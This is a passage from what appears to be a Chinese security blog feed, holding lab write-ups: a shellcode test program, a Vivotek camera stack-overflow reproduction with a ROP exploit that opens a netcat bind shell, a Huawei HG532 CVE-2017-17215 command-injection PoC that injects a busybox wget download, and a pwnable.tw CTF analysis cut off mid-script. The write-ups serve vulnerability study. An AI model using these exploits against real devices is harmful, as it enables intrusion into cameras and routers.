&#39;s&#x2F; $&#x2F;&#x2F;g&#39;|sed &#39;s&#x2F; &#x2F;\\x&#x2F;g&#39;|paste -d &#39;&#39; -s |sed &#39;s&#x2F;^&#x2F;&quot;&#x2F;&#39;|sed &#39;s&#x2F;$&#x2F;&quot;&#x2F;g&#39;</span><br></pre></td></tr></table></figure><p>使用c代码测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Shellcode Length:  %d\n"</span>, <span class="built_in">strlen</span>(code));</span><br><span class="line">    <span class="keyword">int</span> (*ret)() = (<span class="keyword">int</span>(*)())code;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install g++-multilib libc6-dev-i386</span><br><span class="line">$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shellcode</span><br></pre></td></tr></table></figure><p>运行成功</p><p>参考：</p><ul><li><a href="https://www.dazhuanlan.com/2019/12/05/5de8746316981/" target="_blank" rel="noopener">shellcode编写</a></li><li><a href="https://nobe4.fr/shellcode-for-by-newbie/" target="_blank" rel="noopener">Shellcode for/by a Newbie</a></li><li><a href="https://xz.aliyun.com/t/2052" target="_blank" rel="noopener">linux下shellcode的编写</a></li><li><a href="https://blog.csdn.net/raintungli/article/details/43865041" target="_blank" rel="noopener">栈溢出攻击系列：shellcode在linux x86 64位攻击获得root权限（二）shellcode</a></li><li><a href="https://blog.csdn.net/xinghun_4/article/details/8288321" target="_blank" rel="noopener">系统调用和函数参数传递</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vivotek远程栈溢出漏洞复现</title>
      <link href="2020/11/16/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/16/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>漏洞poc: <a href="https://www.exploit-db.com/exploits/44001" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44001</a></p><p>主要参考这篇文章：<a href="https://xz.aliyun.com/t/5054" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054</a></p><h2 id="raspberrypi下搭建"><a href="#raspberrypi下搭建" class="headerlink" title="raspberrypi下搭建"></a>raspberrypi下搭建</h2><p>首先下好环境</p><p>漏洞固件和环境(感谢nop师傅)： <a href="https://pan.baidu.com/s/1l43s8MrRk1AiaDyuD4i5KQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1l43s8MrRk1AiaDyuD4i5KQ</a> 提取码：ke88</p><p>环境扔过去后，还是需要 mount 来挂载，然后 chroot 来执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o bind &#x2F;dev .&#x2F;dev</span><br><span class="line">sudo mount -t proc &#x2F;proc .&#x2F;proc</span><br><span class="line">sudo chroot . .&#x2F;usr&#x2F;sbin&#x2F;httpd</span><br></pre></td></tr></table></figure><p>mount命令是挂载命令，将前一个文件夹挂在到后一个，这样访问后一个就相当于访问前一个</p><p>chroot命令用来在指定的根目录下运行指令。 chroot，即change root directory （更改root 目录）。 在linux 系统中，系统默认的目录结构都是以 / ，即是以根(root) 开始的。 而在使用chroot 之后，系统的目录结构将以指定的位置作为 / 位置。</p><p>遇见报 <code>chroot: failed to run command &#39;./usr/sbin/httpd&#39; :  Permission denied</code> 时，需要用 chmod -R 给 usr bin lib 文件夹都赋权限。</p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;POST &#x2F;cgi-bin&#x2F;admin&#x2F;upgrade.cgi HTTP&#x2F;1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n&quot;  | ncat -v 192.168.43.159 80</span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>调试可以参考原文章</p><p>关闭 aslr 时遇见一个问题，修改不了 /proc/sys/kernel/randomize_va_space ，权限是-rw-r–r– 1 root root 0 Oct 17 07:16 randomize_va_space，但是root和chmodt改不了，pi和root用户下用lsattr和chattr都会报错 chattr: Inappropriate ioctl for device while reading flags on randomize_va_space ，挂载情况是 proc on /proc type proc (rw,relatime)</p><p>但是很匪夷所思的一点是，经过不断的尝试， su 情况下 echo 0 &gt; randomize_va_space 居然能写进去…</p><p>如果有师傅知道这里是为啥，还请告知：<a href="mailto:wu.guang.zheng@qq.com">wu.guang.zheng@qq.com</a></p><p>需要注意的是，原文章中 cat /proc/2949/maps 查看 libc 基址时，中间的数字是进程的 PID …吃了没技术的亏。</p><p>经过调试，发现会在 system 下报 dumping core in /tmp 这个错，有点懵，但是ROP确实是成功了，附上截图，以后说不定用的上</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA-1.png"  alt=""></p><p>这里下断点的地方是libc里的 system 地址（system_addr= libc_base + 0x47ab0），c之前是刚连上的寄存器内容，之后是断下来的寄存器内容，r0是 执行system 的参数，0xbeffe544内是需要执行的代码 nc -lp 4444 -e /bin/sh; ，我的树莓派好像没法执行这个命令，但是我更换成其他命令情况是一样的。</p><p>大体上漏洞已经复现完了，最后的以后有机会再看吧…如果有师傅搞懂了这里是为啥，还请告知：<a href="mailto:wu.guang.zheng@qq.com">wu.guang.zheng@qq.com</a></p><p>附上使用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g1=<span class="number">0x00048784</span> <span class="comment">#: pop &#123;r1, pc&#125;</span></span><br><span class="line">g2=<span class="number">0x00016aa4</span> <span class="comment">#: mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"192.168.43.159"</span>,<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">libc_base =  <span class="number">0xb6dd0000</span>   <span class="comment"># libC 库在内存中的加载地址</span></span><br><span class="line">command_addr = <span class="number">0xbeffe544</span> <span class="comment"># 要执行的代码地址</span></span><br><span class="line">system_addr= libc_base + <span class="number">0x47ab0</span> <span class="comment"># 0xb6e17ab0</span></span><br><span class="line"></span><br><span class="line">g1=libc_base+g1</span><br><span class="line">g2=libc_base+g2</span><br><span class="line">prefix=<span class="string">"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:"</span></span><br><span class="line">command=<span class="string">"nc -lp 4444 -e /bin/sh;"</span></span><br><span class="line">payload=<span class="string">'aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz'</span></span><br><span class="line">payload=payload+p32(g1)+p32(command_addr)+p32(g2)+<span class="string">'a'</span>*<span class="number">8</span>+p32(system_addr)</span><br><span class="line">payload=prefix+payload+command+<span class="string">"nrnrn"</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-17215-华为HG532命令注入漏洞分析</title>
      <link href="2020/11/16/CVE-2017-17215-%E5%8D%8E%E4%B8%BAHG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/11/16/CVE-2017-17215-%E5%8D%8E%E4%B8%BAHG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>CVE-2017-17215-HG532命令注入漏洞</p><p>华为 HG532 系列路由器是一款为家庭和小型办公用户打造的高速无线路由器产品。</p><p>漏洞利用的是upnp服务存在的注入漏洞实现任意命令执行。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Authorization"</span>: <span class="string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">'''&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="string"> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;</span></span><br><span class="line"><span class="string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"&gt;</span></span><br><span class="line"><span class="string">   &lt;NewStatusURL&gt;;/bin/busybox wget -g 172.16.16.17 -l /tmp/1 -r /1;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">  &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string"> &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">requests.post(<span class="string">'http://172.16.16.21:37215/ctrlt/DeviceUpgrade_1'</span>,headers=headers,data=data)</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用binwalk解压固件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me HG532eV100R001C01B020_upgrade_packet.bin</span><br></pre></td></tr></table></figure><p>-Me选项用于递归扫描提取数据</p><p>根据公开的信息可知，漏洞处于upnp服务中，可直接将bin/upnp拖到IDA里面分析，也可以根据poc中的特征字符串<code>ctrlt</code>以及<code>DeviceUpgrade_1</code>寻找，看该字符串处于哪个可执行程序当中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;ctrlt&quot;</span><br><span class="line">Binary file bin&#x2F;upnp matches</span><br><span class="line">$ grep -r &quot;DeviceUpgrade&quot;</span><br><span class="line">Binary file bin&#x2F;upnp matches</span><br><span class="line">$ file bin&#x2F;upnp</span><br><span class="line">bin&#x2F;upnp: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, corrupted section header size</span><br></pre></td></tr></table></figure><p>定位到upnp，查看得知文件类型是mips 32位的，且格式为大端MSB</p><p>扔进ida分析，根据poc，注入点是<code>&lt;NewStatusURL&gt;</code>以及<code>&lt;NewDownloadURL&gt;</code>，在字符串中找到它们：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1.png"  alt=""></p><p>查看引用的地方</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-2.png"  alt=""></p><p>跳转到调用函数可以看到，程序通过<code>ATP_XML_GetChildNodeByName</code>函数获取xml中的<code>&lt;NewStatusURL&gt;</code>节点，并且未经过检查就直接与<code>upg -g -U %s -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r %s -d -</code>拼接使用<code>system</code>函数进行执行。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-3.png"  alt=""></p><p>具体来说利用的原理就是首先在<code>&lt;NewStatusURL&gt;</code>输入单引号将前面的字符串闭合，然后再注入相应的执行命令即可，如需要执行<code>ls</code>命令，则需要做的就是构造<code>&lt;NewStatusURL&gt;&#39;;ls;&lt;/NewStatusURL&gt;</code>节点即可。该节点字符串与<code>upg -g -U %s -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r %s -d -</code>拼接得到<code>upg -g -U %s -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r &#39;;ls; -d -</code>，然后执行system调用，实现注入。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="按照以下方式可以实现通信，但是运行mic网络会崩"><a href="#按照以下方式可以实现通信，但是运行mic网络会崩" class="headerlink" title="按照以下方式可以实现通信，但是运行mic网络会崩"></a>按照以下方式可以实现通信，但是运行mic网络会崩</h3><p>主要依据<a href="https://github.com/Mosk0ng/pwn4fun/blob/master/days/2020_11_7.md" target="_blank" rel="noopener">这里</a>来配置网络环境</p><p>补充：<a href="https://people.debian.org/~aurel32/qemu/mips/" target="_blank" rel="noopener">debian mips qemu镜像链接</a><br>选择 debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta下载</p><p>虚拟机启动命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root&#x3D;&#x2F;dev&#x2F;sda1 console&#x3D;tty0&quot; -net nic -net tap -nographic</span><br></pre></td></tr></table></figure><p>将固件包传到虚拟机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r .&#x2F;squashfs-root root@虚拟机ip:&#x2F;root&#x2F;</span><br></pre></td></tr></table></figure><p>使用<code>chroot . sh</code>切换到该固件的根目录下，根据poc，找一下端口号37215</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;37215&quot;</span><br><span class="line">Binary file bin&#x2F;mic matches</span><br></pre></td></tr></table></figure><p>端口号只出现在mic文件内，所以猜测是mic启动的upnp服务，直接运行<code>mic</code>命令。</p><h3 id="再次尝试"><a href="#再次尝试" class="headerlink" title="再次尝试"></a>再次尝试</h3><p>根据 <a href="https://www.freebuf.com/vuls/160040.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/160040.html</a> 进行配置，但是有一步关闭ens33应为sudo ifdown eth33，再就是最后一步ifup eth1会出错，需要用ifconfig eth0 192.168.0.110 netmask 255.255.255.0再次配置，这里的192.168.0需要参考本机的br0网卡。</p><p>复现成功</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-4.png"  alt=""></p><p>参考：</p><ul><li><a href="https://xz.aliyun.com/t/4819" target="_blank" rel="noopener">CVE-2017-17215-HG532命令注入漏洞分析</a></li><li><a href="https://www.freebuf.com/vuls/160040.html" target="_blank" rel="noopener">通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-applestore-利用栈平衡控制内存</title>
      <link href="2020/11/16/pwnable-tw-applestore-%E5%88%A9%E7%94%A8%E6%A0%88%E5%B9%B3%E8%A1%A1%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98/"/>
      <url>2020/11/16/pwnable-tw-applestore-%E5%88%A9%E7%94%A8%E6%A0%88%E5%B9%B3%E8%A1%A1%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file applestore </span><br><span class="line">applestore: ELF <span class="number">32</span>-<span class="built_in">bit</span> LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.24</span>, BuildID[sha1]=<span class="number">35f</span>3890fc458c22154fbc1d65e9108a6c8738111, <span class="keyword">not</span> stripped</span><br><span class="line">$ checksec applestore </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>运行可知是经典的菜单题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;applestore </span><br><span class="line">&#x3D;&#x3D;&#x3D; Menu &#x3D;&#x3D;&#x3D;</span><br><span class="line">1: Apple Store</span><br><span class="line">2: Add into your shopping cart</span><br><span class="line">3: Remove from your shopping cart</span><br><span class="line">4: List your shopping cart</span><br><span class="line">5: Checkout</span><br><span class="line">6: Exit</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>程序的逻辑首先在main函数中初始化一个全局变量myCart为0，该变量位于bss段，大小为0x10，然后打印menu，进入handler函数</p><blockquote><p>main函数中还有两个限制时间反调试的函数，可以patch掉以便于后续的调试，但是有点诡异的是无法保存修改，经过尝试发现关闭ida的时候先保存database，然后再次打开即可，之后不保存database，原文件也可保存修改</p></blockquote><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><p>首先会调用my_read函数，读取大小为0x15的用户输入到栈上，然后将用户输入通过atoi()函数转化为整型，然后根据结果执行相应功能</p><h3 id="my-read"><a href="#my-read" class="headerlink" title="my_read"></a>my_read</h3><p>此函数调用read函数进行输入，同时将用户输入的最后补0，需要注意的是，保存用户输入的nptr与代表canary的变量v2相差0x22-0xc=0x16个字节，所以并不会破坏canary变量</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>通过my_read函数往栈上写用户的输入，然后用atoi转换，然后调用create与insert函数完成了往购物车的添加功能</p><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><p>create函数申请0x10的内存，实际返回的堆块大小为0x18，因为0x10大小的堆块最大存储用户数据为0xc，32位下再大一点的堆块大小就是0x18，可以存储的数据的空间为0x14，满足用户请求</p><blockquote><p>这里可以看出v2和v3其实是一个变量，所以我们可以在v3变量出点右键，选择<code>map to another variable</code>（快捷键=），选择v2，即可使结果更好看</p></blockquote><p>create函数的第一个参数为手机名字的字符串常量，第二个参数为对应的手机价格。其中调用了asprintf这个函数，这个函数可以根据格式化字符串的最终结果长度自动的申请堆空间的内存，存放字符串，并且将字符串地址赋值给第一个参数。不过通过这种方式申请的堆空间需要用户手动释放。所以可以看到create函数，申请16字节的内存，前4个字节存放了asprintf自动申请，存储手机名的堆的地址，然后4个字节存放的是整型的手机价格，后面的8个字节都是0，用来做什么暂时不知道。返回值为堆块的数据部分的地址，然后add函数将这个地址传入到insert中</p><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">insert</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;myCart; i[<span class="number">2</span>]; i = (_DWORD *)i[<span class="number">2</span>] )</span><br><span class="line">    ;</span><br><span class="line">  i[<span class="number">2</span>] = a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = i;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个循环有一点复杂，我们按照购物车的添加来推演这个函数</p><ol><li>第一次购买手机加入购物车时，myCart往后这0x10字节的内存（位于bss段）都是0。所以i就是myCart的地址，<code>i[2]</code>为0，跳出循环。然后将<code>i[2]</code>也就是<code>*(&amp;myCart+2)</code>赋值为create返回的堆块的地址。然后将堆块偏移12即，堆块最后4个字节赋值为i，即&amp;myCart。</li><li>第二次购买手机加入购物车时，for循环第一次不跳出，因为上一次<code>i[2]</code>有值，为上一次create的堆块的地址，所以根据for的赋值语句，i赋值为上一个堆块的起始地址，然后将<code>i[2]</code>，也就是上一个堆块的第三个4字节赋值为当前堆块的首地址。最后将当前堆块的最后四个字节赋值为前一个堆块的首地址。</li><li>以此类推，myCart是16个字节，每次create的堆块也是16个字节，insert相当于把每次添加进购物车的手机组织成一个不循环的双链表，每次添加一个手机就是往双链表最后添加一个节点，具体这个双链表的数据结构见后文</li></ol><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>双链表的删除</p><p>假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p -&gt; fd -&gt; bk &#x3D; p -&gt; bk</span><br><span class="line">p -&gt; bk -&gt; fd &#x3D; p -&gt; fd</span><br></pre></td></tr></table></figure><p>加上这个节点本身的数据结构的条件，内存的变化即为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd[3]&#x3D;bk</span><br><span class="line">bk[2]&#x3D;fd</span><br></pre></td></tr></table></figure><h3 id="cart"><a href="#cart" class="headerlink" title="cart"></a>cart</h3><p>确认输入的是不是字符y，如果是，则遍历双链表打印购物车内容，返回购物车内商品总价格。这些能打印的函数，在题目中一般都可以用作信息泄露。</p><h3 id="checkout"><a href="#checkout" class="headerlink" title="checkout"></a>checkout</h3><p>调用cart，可以打印购物的的内容，然后如果总价格为7174，则可以将1美元的iphone8添加到购物车里，v2存储asprintf出来的字符串地址，v3为价格。</p><p>触发需要总价格达到7174，iphone的售价分别是199，299，399，499，可以用z3求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a,b,c,d=Ints(<span class="string">'a b c d'</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(a&gt;<span class="number">0</span>,b&gt;<span class="number">0</span>,c&gt;<span class="number">0</span>,d&gt;<span class="number">0</span>)</span><br><span class="line">s.add(<span class="number">199</span>*a + <span class="number">299</span>*b + <span class="number">499</span>*c + <span class="number">399</span>*d == <span class="number">7174</span>)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure><p>解得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sat</span><br><span class="line">[b &#x3D; 3, a &#x3D; 16, c &#x3D; 3, d &#x3D; 4]</span><br></pre></td></tr></table></figure><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>本题设计了一个双链表，每个链表的节点是16字节，存在4个元素，分别为手机名字的字符串地址(&amp;name)，手机价格(price)，链表前向指针(fd)，链表后向指针(bk)，理解这个数据结构是明白本题的关键。当已经加入了一些手机到购物车后，myCart这个位于bss段的节点，充当双链表的表头，其后的节点均为堆空间的内存块：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-1.png"  alt=""></p><p>然后是主要用到这个数据结构的几个函数：</p><ul><li>add: 完成双链表节点的插入</li><li>delete: 完成双链表节点的删除</li><li>cart: 完成双链表节点的遍历，打印每个节点的第一个元素指向的字符串</li><li>checkout: 可以完成双链表节点的遍历，触发彩蛋可以完成一次双链表节点的插入，而且节点位于栈上</li></ul><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>我们触发一下彩蛋</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">io = process(<span class="string">"applestore"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10103</span>)</span><br><span 